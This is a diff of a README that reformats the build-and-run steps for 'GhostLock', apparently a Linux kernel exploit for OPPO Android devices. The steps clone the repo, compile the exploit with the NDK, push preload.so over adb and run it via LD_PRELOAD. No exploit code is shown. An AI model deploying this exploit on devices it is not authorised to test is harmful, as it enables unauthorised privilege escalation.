@@ -32,22 +32,27 @@ GhostLock (CVE-2026-43499) 是一个影响 Linux 2.6.39 至 7.1-rc1 的内核栈
 
 ### 编译部署
 
-```bash
-# 1. 克隆仓库
+
+#### 1. 克隆仓库
+```
 git clone https://github.com/pubglite55/oppo-ghostlock.git
 cd oppo-ghostlock
-
-# 2. 设置 NDK 路径
+```
+#### 2. 设置 NDK 路径
+```
 export NDK=/usr/local/Caskroom/android-ndk/29/AndroidNDK14206865.app/Contents/NDK
-
-# 3. 编译 exploit
+```
+#### 3. 编译 exploit
+```
 cd exploit/
 make clean && make NDK=$NDK
-
-# 4. 推送到设备
+```
+#### 4. 推送到设备
+```
 adb push preload.so /data/local/tmp/
-
-# 5. 运行
+```
+#### 5. 运行
+```
 adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null' 2>&1
 ```
 
